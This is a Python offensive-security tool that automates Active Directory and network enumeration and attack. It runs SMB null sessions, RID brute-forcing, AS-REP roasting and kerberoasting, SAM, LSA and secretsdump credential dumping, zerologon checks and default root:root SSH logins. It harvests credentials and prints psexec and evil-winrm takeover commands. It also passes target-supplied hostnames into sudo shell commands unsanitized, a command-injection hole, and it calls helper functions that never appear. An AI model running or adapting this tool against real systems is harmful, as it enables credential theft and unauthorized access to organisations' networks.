#!/usr/bin/env python3
import asyncio
import argparse
import os
import sys
import socket
import re
import subprocess
import random
from datetime import datetime
from typing import List, Tuple, Optional, Dict

# --- Color Definitions & ADHD Friendly Output ---
class Colors:
    NC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[0;30m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'
    
    # Bright Colors
    BRED = '\033[1;31m'
    BGREEN = '\033[1;32m'
    BYELLOW = '\033[1;33m'
    BBLUE = '\033[1;34m'
    BMAGENTA = '\033[1;35m'
    BCYAN = '\033[1;36m'
    BWHITE = '\033[1;37m'

def log_info(msg):
    print(f"{Colors.BCYAN}ℹ️  [*] {msg}{Colors.NC}")

def log_success(msg):
    print(f"{Colors.BGREEN}✅ [+] {msg}{Colors.NC}")

def log_warning(msg):
    print(f"{Colors.BYELLOW}⚠️  [!] {msg}{Colors.NC}")

def log_error(msg):
    print(f"{Colors.BRED}❌ [-] {msg}{Colors.NC}")

def log_cmd(msg):
    print(f"{Colors.BMAGENTA}🚀 [>] {msg}{Colors.NC}")

def log_section(msg):
    print(f"\n{Colors.BBLUE}━━━━━━━━━━━━━━━ {Colors.BWHITE}{Colors.BOLD}{msg}{Colors.BBLUE} ━━━━━━━━━━━━━━━{Colors.NC}")

# --- Global State ---
class State:
    IP = ""
    USER = ""
    PASS = ""
    DOMAIN = ""
    HASH = ""
    OS_TYPE = ""
    DC_IP = ""
    HAS_PROMOTED = False
    USE_LOCAL_AUTH = False
    ENUM_DIR = "nxc-enum"
    VALID_CREDS_FILE = "nxc-enum/valid_credentials.txt"
    POTENTIAL_CREDS_FILE = "nxc-enum/potential_credentials.txt"
    STEALTH = False
    CHECK_ALIVE = False
    SEMAPHORE = None

# --- Utility Functions ---

async def check_dependencies():
    log_section("Checking Dependencies")
    tools = {
        "nxc": "sudo apt update && sudo apt install netexec -y",
        "impacket-lookupsid": "sudo apt update && sudo apt install python3-impacket -y",
        "rpcclient": "sudo apt update && sudo apt install smbclient -y",
        "ldapsearch": "sudo apt update && sudo apt install ldap-utils -y",
        "showmount": "sudo apt update && sudo apt install nfs-common -y",
        "enum4linux": "sudo apt update && sudo apt install enum4linux -y",
        "ldapdomaindump": "sudo apt update && sudo apt install ldapdomaindump -y",
        "smbmap": "sudo apt update && sudo apt install smbmap -y",
        "certipy": "pipx install certipy-ad",
        "unbuffer": "sudo apt update && sudo apt install expect -y",
        "curl": "sudo apt update && sudo apt install curl -y",
        "kerbrute": "wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute && chmod +x kerbrute && sudo mv kerbrute /usr/local/bin/",
        "enum4linux-ng": "pipx install enum4linux-ng",
    }
    
    missing_tools = []
    install_cmds = []
    
    home_bin = os.path.expanduser("~/.local/bin")
    
    for tool, install_cmd in tools.items():
        # 1. Check if tool exists in system PATH
        proc = await asyncio.create_subprocess_exec(
            "which", tool,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        await proc.wait()
        if proc.returncode == 0:
            continue
            
        # 2. Check in common local bin (pipx, etc.)
        if os.path.isfile(os.path.join(home_bin, tool)) or os.path.isfile(os.path.join("/usr/local/bin", tool)):
            continue

        # Special check for impacket tools
        if tool.startswith("impacket-"):
            alt_tool = tool.replace("impacket-", "") + ".py"
            proc_alt = await asyncio.create_subprocess_exec(
                "which", alt_tool,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await proc_alt.wait()
            if proc_alt.returncode == 0 or os.path.isfile(os.path.join(home_bin, alt_tool)):
                continue
        
        missing_tools.append(tool)
        install_cmds.append(install_cmd)
            
    if missing_tools:
        log_warning("The following tools are missing:")
        for tool in missing_tools:
            print(f"  - {Colors.BRED}{tool}{Colors.NC}")
        
        print("")
        log_info("To install them on Kali Linux, run:")
        for cmd in sorted(list(set(install_cmds))):
            print(f"  {Colors.BMAGENTA}{cmd}{Colors.NC}")
        print("")
        
        # Add tip about pipx path
        if "certipy" in missing_tools:
            log_info(f"Tip: If certipy is installed but not found, run: {Colors.BOLD}pipx ensurepath{Colors.NC}")
            print("")
        
        choice = input(f"{Colors.BYELLOW}⚠️  Some enumeration modules will fail. Do you want to continue anyway? [y/N]: {Colors.NC}")
        if choice.lower() != 'y':
            log_error("Exiting. Please install missing dependencies.")
            sys.exit(1)
    else:
        log_success("All essential tools are installed!")

def update_hosts_file(ip, names):
    if not names or not ip:
        return

    # Deduplicate and filter names
    unique_names = list(dict.fromkeys([n.lower() for n in names if n and n != ip]))
    if not unique_names:
        return

    # Check /etc/hosts
    try:
        with open("/etc/hosts", "r") as f:
            hosts_lines = f.readlines()
    except Exception as e:
        log_error(f"Failed to read /etc/hosts: {e}")
        return

    missing_names = []
    conflict_names = []
    
    for name in unique_names:
        found = False
        for line in hosts_lines:
            parts = line.split()
            if len(parts) >= 2 and name in parts[1:]:
                if parts[0] == ip:
                    found = True
                    break
                else:
                    conflict_names.append(f"{name} ({parts[0]})")
                    found = True
                    break
        if not found:
            missing_names.append(name)

    if missing_names or conflict_names:
        log_warning(f"Hostname mapping needs update for {ip}:")
        if missing_names: print(f"   {Colors.BCYAN}Missing:{Colors.NC} {' '.join(missing_names)}")
        if conflict_names: print(f"   {Colors.BRED}Conflicts:{Colors.NC} {' '.join(conflict_names)}")
        
        choice = input(f"\n{Colors.BYELLOW}❓ Do you want to update /etc/hosts? [y/N]: {Colors.NC}")
        if choice.lower() == 'y':
            # Construct sed commands to remove conflicting/existing names
            for name in unique_names:
                subprocess.run(f"sudo sed -i '/[[:space:]]{name}\\($\\|[[:space:]]\\)/d' /etc/hosts", shell=True)
            
            # Add new consolidated line
            hosts_line = f"{ip} {' '.join(unique_names)}"
            cmd = f"echo '{hosts_line}' | sudo tee -a /etc/hosts >/dev/null"
            subprocess.run(cmd, shell=True)
            log_success(f"Updated /etc/hosts with: {Colors.BWHITE}{hosts_line}{Colors.NC}")
        else:
            log_info("Skipping /etc/hosts update")
    else:
        log_info(f"All hostnames ({', '.join(unique_names)}) already correctly mapped in /etc/hosts")

async def detect_target_info():
    log_info(f"Attempting to auto-detect target OS and Domain for {State.IP}...")
    discovered_names = []
    
    # Check ports in parallel
    port_tasks = {
        445: "SMB",
        389: "LDAP",
        3389: "RDP",
        22: "SSH",
        5985: "WinRM"
    }
    
    open_ports = []
    results = await asyncio.gather(*[check_port(State.IP, p) for p in port_tasks.keys()])
    for i, p in enumerate(port_tasks.keys()):
        if results[i]:
            open_ports.append(p)

    # Priority 1: SMB (Port 445)
    if 445 in open_ports:
        rc, out = await async_run_cmd(["nxc", "smb", State.IP, "--timeout", "5"])
        if "windows" in out.lower():
            State.OS_TYPE = "windows"
            log_success(f"Auto-detected OS: {Colors.BWHITE}Windows{Colors.NC} (via NetExec SMB)")
        elif "linux" in out.lower() or "samba" in out.lower():
            State.OS_TYPE = "linux"
            log_success(f"Auto-detected OS: {Colors.BWHITE}Linux/Samba{Colors.NC} (via NetExec SMB)")
        else:
            State.OS_TYPE = "windows"
            log_info(f"SMB port 445 open, assuming {Colors.BWHITE}Windows{Colors.NC}.")

        # Extract Names
        domain_match = re.search(r'domain:([^\s\)]+)', out)
        name_match = re.search(r'name:([^\s\)]+)', out)
        
        if domain_match:
            State.DOMAIN = domain_match.group(1).strip()
            log_success(f"Auto-discovered domain: {Colors.BWHITE}{State.DOMAIN}{Colors.NC}")
            discovered_names.append(State.DOMAIN)
            
            # FQDN
            if name_match:
                discovered_names.append(f"{name_match.group(1)}.{State.DOMAIN}")
            
            # Forest root
            if State.DOMAIN.count('.') >= 2:
                forest_root = ".".join(State.DOMAIN.split('.')[1:])
                discovered_names.append(forest_root)
        
        if name_match:
            discovered_names.append(name_match.group(1))

        update_hosts_file(State.IP, discovered_names)
        return

    # Priority 2: LDAP (Port 389)
    if 389 in open_ports:
        State.OS_TYPE = "windows"
        log_success(f"Auto-detected OS: {Colors.BWHITE}Windows{Colors.NC} (via LDAP)")
        rc, out = await async_run_cmd(["nxc", "ldap", State.IP, "--timeout", "5"])
        domain_match = re.search(r'domain:([^\s\)]+)', out)
        name_match = re.search(r'name:([^\s\)]+)', out)
        
        if domain_match:
            State.DOMAIN = domain_match.group(1).strip()
            log_success(f"Auto-discovered domain: {Colors.BWHITE}{State.DOMAIN}{Colors.NC} (via LDAP)")
            discovered_names.append(State.DOMAIN)
            if name_match:
                discovered_names.append(f"{name_match.group(1)}.{State.DOMAIN}")
            if State.DOMAIN.count('.') >= 2:
                forest_root = ".".join(State.DOMAIN.split('.')[1:])
                discovered_names.append(forest_root)
        
        if name_match:
            discovered_names.append(name_match.group(1))

        update_hosts_file(State.IP, discovered_names)
        return

    # Priority 3: RDP (Port 3389)
    if 3389 in open_ports:
        State.OS_TYPE = "windows"
        log_success(f"Auto-detected OS: {Colors.BWHITE}Windows{Colors.NC} (via RDP)")
        rc, out = await async_run_cmd(["nxc", "rdp", State.IP, "--timeout", "5"])
        domain_match = re.search(r'domain:([^\s\)]+)', out)
        name_match = re.search(r'name:([^\s\)]+)', out)
        if domain_match:
            State.DOMAIN = domain_match.group(1).strip()
            log_success(f"Auto-discovered domain: {Colors.BWHITE}{State.DOMAIN}{Colors.NC} (via RDP)")
            discovered_names.append(State.DOMAIN)
            if name_match:
                discovered_names.append(f"{name_match.group(1)}.{State.DOMAIN}")
        if name_match:
            discovered_names.append(name_match.group(1))
        
        update_hosts_file(State.IP, discovered_names)
        return

    # Priority 4: SSH (Port 22)
    if 22 in open_ports:
        State.OS_TYPE = "linux"
        log_success(f"Auto-detected OS: {Colors.BWHITE}Linux{Colors.NC} (via SSH)")
        return

    # Priority 5: WinRM
    if 5985 in open_ports:
        State.OS_TYPE = "windows"
        log_success(f"Auto-detected OS: {Colors.BWHITE}Windows{Colors.NC} (via WinRM)")
        rc, out = await async_run_cmd(["nxc", "winrm", State.IP, "--timeout", "5"])
        domain_match = re.search(r'domain:([^\s\)]+)', out)
        name_match = re.search(r'name:([^\s\)]+)', out)
        if domain_match:
            State.DOMAIN = domain_match.group(1).strip()
            discovered_names.append(State.DOMAIN)
            if name_match:
                discovered_names.append(f"{name_match.group(1)}.{State.DOMAIN}")
        if name_match:
            discovered_names.append(name_match.group(1))
        
        update_hosts_file(State.IP, discovered_names)
        return

    # Fallback
    if not State.OS_TYPE:
        State.OS_TYPE = "windows"
        log_warning(f"Could not reliably detect OS. Defaulting to {Colors.BWHITE}Windows{Colors.NC}.")

def harvest_credentials(output):
    """Parses tool output for valid credentials and adds them to the state."""
    # Remove ANSI color codes for parsing
    clean_out = re.sub(r'\x1b\[[0-9;]*m', '', output)
    
    for line in clean_out.splitlines():
        if "[+]" in line:
            cred = line.split("[+]")[-1].strip()
            if cred:
                with open(State.VALID_CREDS_FILE, "a+") as f:
                    f.seek(0)
                    if cred not in f.read():
                        f.write(f"{cred}\n")
                        log_success(f"Harvested valid credential: {Colors.BWHITE}{cred}{Colors.NC}")

        if any(x in line for x in ["STATUS_PASSWORD_MUST_CHANGE", "STATUS_PASSWORD_EXPIRED"]):
            cred = line.split("[-]")[1].split()[0].strip()
            with open(State.POTENTIAL_CREDS_FILE, "a+") as f:
                f.seek(0)
                if cred not in f.read():
                    f.write(f"{cred} (PASSWORD_EXPIRED)\n")
                    log_warning(f"Harvested potential credential (expired): {Colors.BWHITE}{cred}{Colors.NC}")

def promote_verified_creds():
    """Promotes the first found credential to the primary user if none set or if using a file."""
    if not os.path.exists(State.VALID_CREDS_FILE) or os.path.getsize(State.VALID_CREDS_FILE) == 0:
        return False
    
    if State.HAS_PROMOTED:
        return False

    with open(State.VALID_CREDS_FILE, "r") as f:
        best_cred = f.readline().strip()

    if not best_cred:
        return False

    log_success(f"Found valid credentials: {Colors.BWHITE}{best_cred}{Colors.NC}")
    
    # Parse domain\user:secret or user:secret
    disc_domain = ""
    if "\\" in best_cred:
        disc_domain, remainder = best_cred.split("\\", 1)
    else:
        remainder = best_cred

    disc_user, disc_secret = remainder.split(":", 1)
    
    if disc_user == State.USER and not os.path.isfile(State.USER):
        return False

    log_info(f"Promoting '{Colors.BWHITE}{disc_user}{Colors.NC}' as primary user...")
    
    if disc_domain:
        State.DOMAIN = disc_domain
    State.USER = disc_user
    
    # Check if hash or password
    if re.match(r'^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$', disc_secret):
        State.HASH = disc_secret
        State.PASS = ""
    else:
        State.PASS = disc_secret
        State.HASH = ""
        
    State.HAS_PROMOTED = True
    return True

async def check_and_suggest(service, cmd):
    """Runs a command, harvests credentials, and provides copy-paste suggestions."""
    rc, out = await async_run_cmd(cmd)
    print(out)
    
    harvest_credentials(out)
    
    if "[+]" in out or "Pwn3d!" in out:
        log_success(f"Valid credentials found for {service}!")
        
        # Build suggestions based on service
        # (This will be a large block, starting with SMB)
        if service == "smb":
            suggest_smb(out)
        elif service == "ldap":
            suggest_ldap(out)
        elif service == "winrm":
            suggest_winrm(out)
        elif service == "ssh":
            suggest_ssh(out)
        elif service == "rdp":
            suggest_rdp(out)
        elif service == "mssql":
            suggest_mssql(out)

    return out

def suggest_ssh(output):
    log_section("SSH Suggestions")
    log_success("SSH ACCESS DETECTED")
    print(f"ssh {State.USER}@{State.IP}")
    if State.PASS:
        print(f"sshpass -p '{State.PASS}' ssh {State.USER}@{State.IP}")

def suggest_rdp(output):
    log_section("RDP Suggestions")
    log_success("RDP ACCESS DETECTED")
    print(f"xfreerdp /v:{State.IP} /u:{State.USER} /p:{State.PASS if State.PASS else ''} {'/d:' + State.DOMAIN if State.DOMAIN else ''} /clipboard /dynamic-resolution")

def suggest_mssql(output):
    log_section("MSSQL Suggestions")
    log_success("MSSQL ACCESS DETECTED")
    target = f"{State.DOMAIN}/{State.USER}" if State.DOMAIN else State.USER
    if State.HASH:
        print(f"impacket-mssqlclient {target}@{State.IP} -hashes :{State.HASH}")
    else:
        print(f"impacket-mssqlclient {target}:'{State.PASS}'@{State.IP}")

def suggest_smb(output):
    clean_out = re.sub(r'\x1b\[[0-9;]*m', '', output)
    
    target = f"{State.DOMAIN}/{State.USER}" if State.DOMAIN else State.USER
    if State.HASH:
        impacket_creds = f"{target} -hashes :{State.HASH}"
        smbclient_creds = f"-U '{target}' --pw-nt-hash {State.HASH}"
    else:
        impacket_creds = f"{target}:'{State.PASS}'"
        smbclient_creds = f"-U '{target}%{State.PASS}'"

    log_section("SMB Suggestions")
    if "Pwn3d!" in output:
        log_success("ADMIN ACCESS DETECTED (Pwn3d!)")
        print(f"impacket-psexec {impacket_creds}@{State.IP}")
        print(f"impacket-wmiexec {impacket_creds}@{State.IP}")
        print(f"impacket-smbexec {impacket_creds}@{State.IP}")
        print(f"nxc smb {State.IP} -u {State.USER} {'-p ' + State.PASS if State.PASS else '-H ' + State.HASH} --sam")
    
    # Parse shares
    shares = []
    for line in clean_out.splitlines():
        if any(x in line for x in ["READ", "WRITE"]):
            match = re.search(r'\\\\([^\s]+)', line)
            if match:
                share_name = match.group(1)
                permissions = "READ" if "READ" in line else ""
                if "WRITE" in line:
                    permissions += ",WRITE" if permissions else "WRITE"
                shares.append((share_name, permissions))

    if shares:
        log_info("Accessible Shares:")
        for name, perm in shares:
            color = Colors.BRED if "WRITE" in perm else Colors.BGREEN
            print(f"  - {color}{name}{Colors.NC} ({perm})")
            print(f"    smbclient {smbclient_creds} //{State.IP}/{name}")
            if "WRITE" in perm:
                print(f"    {Colors.BYELLOW}# Writable! Try: put local_file.txt{Colors.NC}")

def suggest_ldap(output):
    log_section("LDAP Suggestions")
    target = f"{State.DOMAIN}/{State.USER}" if State.DOMAIN else State.USER
    if State.PASS:
        print(f"ldapdomaindump -u '{target}' -p '{State.PASS}' ldap://{State.IP}")
        print(f"bloodhound-python -u {State.USER} -p '{State.PASS}' -d {State.DOMAIN} -ns {State.IP} -c All")

def suggest_winrm(output):
    log_section("WinRM Suggestions")
    if State.HASH:
        print(f"evil-winrm -i {State.IP} -u {State.USER} -H {State.HASH}")
    else:
        print(f"evil-winrm -i {State.IP} -u {State.USER} -p '{State.PASS}'")

async def enum_smb(anonymous=True):
    log_section(f"SMB Enumeration ({'Anonymous' if anonymous else 'Authenticated'})")
    
    if anonymous:
        tasks = []
        # NetExec Guest/Null
        tasks.append(check_and_suggest("smb", ["nxc", "smb", State.IP, "-u", "guest", "-p", "", "--shares"]))
        tasks.append(check_and_suggest("smb", ["nxc", "smb", State.IP, "-u", "", "-p", "", "--shares"]))
        
        # Deep Enum tasks (Impacket, etc.)
        tasks.append(async_run_cmd(["impacket-lookupsid", "-no-pass", f"anonymous@{State.IP}"], outfile=f"{State.ENUM_DIR}/smb/lookupsid-anonymous.txt"))
        tasks.append(async_run_cmd(["impacket-samrdump", State.IP], outfile=f"{State.ENUM_DIR}/smb/samrdump-anonymous.txt"))
        tasks.append(async_run_cmd(["nxc", "smb", State.IP, "-u", "", "-p", "", "--rid-brute"], outfile=f"{State.ENUM_DIR}/smb/nxc-rid-anonymous.txt"))
        tasks.append(async_run_cmd(["rpcclient", "-U", "", "-N", State.IP, "-c", "enumdomusers"], outfile=f"{State.ENUM_DIR}/smb/rpcclient-enumdomusers.txt"))
        
        if os.path.exists("/usr/bin/enum4linux"):
            tasks.append(async_run_cmd(["enum4linux", "-U", State.IP], outfile=f"{State.ENUM_DIR}/smb/enum4linux-users.txt"))
            
        await asyncio.gather(*tasks)
        
        # Extract users for potential spraying/asrep
        extract_users_from_files()
        
        # AS-REP Roasting if domain and users found
        users_file = get_latest_users_file()
        if State.DOMAIN and users_file:
            log_info("Attempting AS-REP Roasting (Anonymous discovered users)...")
            await async_run_cmd(["impacket-GetNPUsers", f"{State.DOMAIN}/", "-usersfile", users_file, "-no-pass", "-dc-ip", State.IP], outfile=f"{State.ENUM_DIR}/smb/asrep-anonymous.txt")

    else:
        # Authenticated
        tasks = []
        cmd = ["nxc", "smb", State.IP, "-u", State.USER]
        if State.PASS: cmd.extend(["-p", State.PASS])
        if State.HASH: cmd.extend(["-H", State.HASH])
        if State.DOMAIN: cmd.extend(["-d", State.DOMAIN])
        cmd.append("--shares")
        tasks.append(check_and_suggest("smb", cmd))
        
        # Modules
        tasks.append(async_run_cmd(cmd[:-1] + ["-M", "spider_plus"], outfile=f"{State.ENUM_DIR}/smb/spider-plus.txt"))
        tasks.append(async_run_cmd(cmd[:-1] + ["-M", "zerologon"], outfile=f"{State.ENUM_DIR}/smb/zerologon.txt"))
        tasks.append(async_run_cmd(cmd[:-1] + ["--sam"], outfile=f"{State.ENUM_DIR}/smb/sam-hashes.txt"))
        tasks.append(async_run_cmd(cmd[:-1] + ["--lsa"], outfile=f"{State.ENUM_DIR}/smb/lsa-secrets.txt"))
        tasks.append(async_run_cmd(cmd[:-1] + ["--loggedon-users"], outfile=f"{State.ENUM_DIR}/smb/logged-users.txt"))
        
        await asyncio.gather(*tasks)

async def enum_ldap(anonymous=True):
    if not await check_port(State.IP, 389, "LDAP"): return
    log_section(f"LDAP Enumeration ({'Anonymous' if anonymous else 'Authenticated'})")
    
    if anonymous:
        tasks = []
        tasks.append(check_and_suggest("ldap", ["nxc", "ldap", State.IP, "-u", "", "-p", "", "--timeout", "15"]))
        tasks.append(check_and_suggest("ldap", ["nxc", "ldap", State.IP, "-u", "guest", "-p", "", "--timeout", "15"]))
        tasks.append(async_run_cmd(["ldapsearch", "-x", "-H", f"ldap://{State.IP}", "-s", "base", "namingContexts"], outfile=f"{State.ENUM_DIR}/ldap/ldap-naming-contexts.txt"))
        await asyncio.gather(*tasks)
    else:
        tasks = []
        base_cmd = ["nxc", "ldap", State.IP, "-u", State.USER]
        if State.PASS: base_cmd.extend(["-p", State.PASS])
        if State.HASH: base_cmd.extend(["-H", State.HASH])
        if State.DOMAIN: base_cmd.extend(["-d", State.DOMAIN])
        
        # Deep AD Checks
        tasks.append(check_and_suggest("ldap", base_cmd + ["--users", "--groups", "--admin-count"]))
        tasks.append(async_run_cmd(base_cmd + ["--bloodhound", "-c", "all", "--dns-server", State.IP], outfile=f"{State.ENUM_DIR}/ldap/bloodhound-collection.txt"))
        tasks.append(async_run_cmd(base_cmd + ["--kerberoasting", f"{State.ENUM_DIR}/ldap/kerberoasting.txt"]))
        tasks.append(async_run_cmd(base_cmd + ["--asreproast", f"{State.ENUM_DIR}/ldap/asreproasting.txt"]))
        tasks.append(async_run_cmd(base_cmd + ["-M", "maq"], outfile=f"{State.ENUM_DIR}/ldap/maq.txt"))
        tasks.append(async_run_cmd(base_cmd + ["-M", "adcs"], outfile=f"{State.ENUM_DIR}/ldap/adcs.txt"))
        
        # Certipy
        certipy_cmd = ["certipy", "find", "-u", f"{State.USER}@{State.DOMAIN}" if State.DOMAIN else State.USER, "-p", State.PASS if State.PASS else State.HASH, "-target", State.DOMAIN if State.DOMAIN else State.IP, "-dc-ip", State.IP, "-vulnerable", "-enabled", "-stdout"]
        tasks.append(async_run_cmd(certipy_cmd, outfile=f"{State.ENUM_DIR}/ldap/certipy_output.txt"))

        await asyncio.gather(*tasks)

async def enum_rpc():
    log_section("RPC Enumeration")
    if not State.USER:
        log_warning("Skipping RPC Enumeration (no username supplied)")
        return
        
    tasks = []
    # rpcclient checks
    if State.PASS:
        rpc_arg = f"-U '{State.DOMAIN}\\{State.USER}%{State.PASS}'"
    elif State.HASH:
        rpc_arg = f"-U '{State.DOMAIN}\\{State.USER}' --pw-nt-hash {State.HASH}"
    else:
        rpc_arg = f"-U '{State.DOMAIN}\\{State.USER}%'"

    tasks.append(async_run_cmd(["bash", "-c", f"rpcclient {rpc_arg} {State.IP} -c 'enumdomusers'"], outfile=f"{State.ENUM_DIR}/smb/rpc-enumdomusers.txt"))
    tasks.append(async_run_cmd(["bash", "-c", f"rpcclient {rpc_arg} {State.IP} -c 'enumdomgroups'"], outfile=f"{State.ENUM_DIR}/smb/rpc-enumdomgroups.txt"))
    
    # Secretsdump
    if State.PASS or State.HASH:
        target = f"{State.DOMAIN}/{State.USER}" if State.DOMAIN else State.USER
        sd_cmd = ["impacket-secretsdump"]
        if State.HASH: sd_cmd.extend(["-hashes", f":{State.HASH}"])
        sd_cmd.append(f"{target}:{State.PASS if State.PASS else ''}@{State.IP}")
        tasks.append(async_run_cmd(sd_cmd, outfile=f"{State.ENUM_DIR}/smb/rpc-secretsdump.txt"))

    await asyncio.gather(*tasks)

async def enum_nfs():
    if not await check_port(State.IP, 2049, "NFS"): return
    log_section("NFS Enumeration")
    await asyncio.gather(
        async_run_cmd(["nxc", "nfs", State.IP, "--shares"], outfile=f"{State.ENUM_DIR}/smb/nfs-shares.txt"),
        async_run_cmd(["showmount", "-e", State.IP], outfile=f"{State.ENUM_DIR}/smb/nfs-showmount.txt")
    )

async def enum_ftp():
    if not await check_port(State.IP, 21, "FTP"): return
    log_section("FTP Enumeration")
    rc, out = await async_run_cmd(["curl", "-s", "--connect-timeout", "5", f"ftp://{State.IP}/"], outfile=f"{State.ENUM_DIR}/smb/ftp-banner.txt")
    
    tasks = [
        async_run_cmd(["nxc", "ftp", State.IP, "-u", "anonymous", "-p", "anonymous"], outfile=f"{State.ENUM_DIR}/smb/ftp-anon.txt")
    ]
    
    if "ProFTPD" in out:
        log_error(f"ProFTPD detected! Possible mod_copy vulnerability (CVE-2015-3306)")
        log_info("Try: SITE CPFR /etc/passwd; SITE CPTO /var/www/html/out.txt")
        
    await asyncio.gather(*tasks)

async def enum_telnet():
    if not await check_port(State.IP, 23, "Telnet"): return
    log_section("Telnet Enumeration")
    await async_run_cmd(["curl", "-s", "--connect-timeout", "5", f"telnet://{State.IP}"], outfile=f"{State.ENUM_DIR}/smb/telnet-banner.txt")

async def enum_winrm_deep():
    if not await check_port(State.IP, 5985, "WinRM"): return
    log_section("WinRM Deep Enumeration")
    if State.USER:
        cmd = ["nxc", "winrm", State.IP, "-u", State.USER]
        if State.PASS: cmd.extend(["-p", State.PASS])
        if State.HASH: cmd.extend(["-H", State.HASH])
        if State.DOMAIN: cmd.extend(["-d", State.DOMAIN])
        
        await asyncio.gather(
            check_and_suggest("winrm", cmd),
            async_run_cmd(cmd + ["-x", "whoami"], outfile=f"{State.ENUM_DIR}/smb/winrm-whoami.txt")
        )

async def enum_rdp():
    if not await check_port(State.IP, 3389, "RDP"): return
    log_section("RDP Enumeration")
    if State.USER:
        cmd = ["nxc", "rdp", State.IP, "-u", State.USER]
        if State.PASS: cmd.extend(["-p", State.PASS])
        if State.HASH: cmd.extend(["-H", State.HASH])
        if State.DOMAIN: cmd.extend(["-d", State.DOMAIN])
        await check_and_suggest("rdp", cmd)

async def scan_web_port(port):
    protocol = "https" if port in [443, 8443] else "http"
    url = f"{protocol}://{State.IP}:{port}"
    log_success(f"Port {port} is OPEN ({protocol})!")
    
    tasks = [
        async_run_cmd(["curl", "-I", "-k", "-s", "-m", "5", url], outfile=f"{State.ENUM_DIR}/http/headers_{port}.txt")
    ]
    
    # Check for robots.txt as a basic discovery
    tasks.append(async_run_cmd(["curl", "-k", "-s", "-m", "5", f"{url}/robots.txt"], outfile=f"{State.ENUM_DIR}/http/robots_{port}.txt"))
        
    await asyncio.gather(*tasks)
    
    # Suggestions for other tools
    log_section(f"Web Suggestions ({port})")
    print(f"whatweb {url}")
    print(f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -k")
    print(f"nikto -h {url}")

async def enum_http():
    log_section("Web Enumeration (HTTP/HTTPS)")
    # Expanded web ports
    web_ports = [80, 443, 8080, 8443, 8000, 8008, 8888]
    
    # Check which ports are open first
    open_web_ports = []
    results = await asyncio.gather(*[check_port(State.IP, p) for p in web_ports])
    for i, p in enumerate(web_ports):
        if results[i]:
            open_web_ports.append(p)
            
    if not open_web_ports:
        log_info("No common web ports open.")
        return

    await asyncio.gather(*[scan_web_port(p) for p in open_web_ports])

async def enum_ssh():
    if not await check_port(State.IP, 22, "SSH"): return
    log_section("SSH Enumeration")
    
    tasks = [
        async_run_cmd(["curl", "-s", "--connect-timeout", "5", f"telnet://{State.IP}:22"], outfile=f"{State.ENUM_DIR}/smb/ssh-banner.txt")
    ]
    
    if State.USER:
        cmd = ["nxc", "ssh", State.IP, "-u", State.USER]
        if State.PASS: cmd.extend(["-p", State.PASS])
        if State.HASH: cmd.extend(["-H", State.HASH])
        
        tasks.append(check_and_suggest("ssh", cmd))
        tasks.append(async_run_cmd(cmd + ["-x", "id; uname -a"], outfile=f"{State.ENUM_DIR}/smb/ssh-exec.txt"))
    else:
        # Try some common defaults or just basic check
        tasks.append(async_run_cmd(["nxc", "ssh", State.IP, "-u", "root", "-p", "root"], outfile=f"{State.ENUM_DIR}/smb/ssh-root-root.txt"))

    await asyncio.gather(*tasks)

def extract_users_from_files():
    """Extracts usernames from all discovery files in the smb directory."""
    users = set()
    smb_dir = os.path.join(State.ENUM_DIR, "smb")
    if not os.path.exists(smb_dir): return

    patterns = [
        r"SidTypeUser\s+\d+\s+([^\s\\]+)", # lookupsid
        r"user:\[([^\]]+)\]", # rpcclient
        r"\[\+\]\s+([^\s\\]+):", # generic nxc
    ]

    for filename in os.listdir(smb_dir):
        if "users_" in filename: continue
        try:
            with open(os.path.join(smb_dir, filename), "r", errors="ignore") as f:
                content = f.read()
                for pattern in patterns:
                    for match in re.finditer(pattern, content):
                        u = match.group(1).strip()
                        if u and not u.endswith("$"):
                            users.add(u)
        except:
            continue

    if users:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        users_file = os.path.join(smb_dir, f"users_{timestamp}.txt")
        with open(users_file, "w") as f:
            f.write("\n".join(sorted(list(users))) + "\n")
        log_success(f"Extracted {len(users)} unique usernames to: {Colors.BWHITE}{users_file}{Colors.NC}")

def get_latest_users_file():
    smb_dir = os.path.join(State.ENUM_DIR, "smb")
    if not os.path.exists(smb_dir): return None
    files = [os.path.join(smb_dir, f) for f in os.listdir(smb_dir) if f.startswith("users_")]
    return max(files, key=os.path.getmtime) if files else None

async def enum_mssql():
    if not await check_port(State.IP, 1433, "MSSQL"): return
    log_section("MSSQL Enumeration")
    cmd = ["nxc", "mssql", State.IP, "-u", State.USER]
    if State.PASS: cmd.extend(["-p", State.PASS])
    if State.HASH: cmd.extend(["-H", State.HASH])
    if State.DOMAIN: cmd.extend(["-d", State.DOMAIN])
    
    tasks = [
        async_run_cmd(cmd, outfile=f"{State.ENUM_DIR}/smb/mssql-info.txt"),
        async_run_cmd(cmd + ["-x", "EXEC xp_dirtree 'C:\\', 1;"], outfile=f"{State.ENUM_DIR}/smb/mssql-xp-dirtree.txt"),
        async_run_cmd(cmd + ["-x", "EXEC sp_databases;"], outfile=f"{State.ENUM_DIR}/smb/mssql-databases.txt")
    ]
    await asyncio.gather(*tasks)

async def enum_wmi():
    if not await check_port(State.IP, 135, "WMI (RPC)"): return
    log_section("WMI Enumeration")
    if State.USER:
        cmd = ["nxc", "wmi", State.IP, "-u", State.USER]
        if State.PASS: cmd.extend(["-p", State.PASS])
        if State.HASH: cmd.extend(["-H", State.HASH])
        if State.DOMAIN: cmd.extend(["-d", State.DOMAIN])
        
        await asyncio.gather(
            check_and_suggest("wmi", cmd),
            async_run_cmd(cmd + ["-x", "whoami"], outfile=f"{State.ENUM_DIR}/smb/wmi-whoami.txt")
        )

async def enum_vnc():
    if not await check_port(State.IP, 5900, "VNC"): return
    log_section("VNC Enumeration")
    if State.USER and State.PASS: # VNC usually needs password
        await async_run_cmd(["nxc", "vnc", State.IP, "-u", State.USER, "-p", State.PASS], outfile=f"{State.ENUM_DIR}/smb/vnc-credentials.txt")

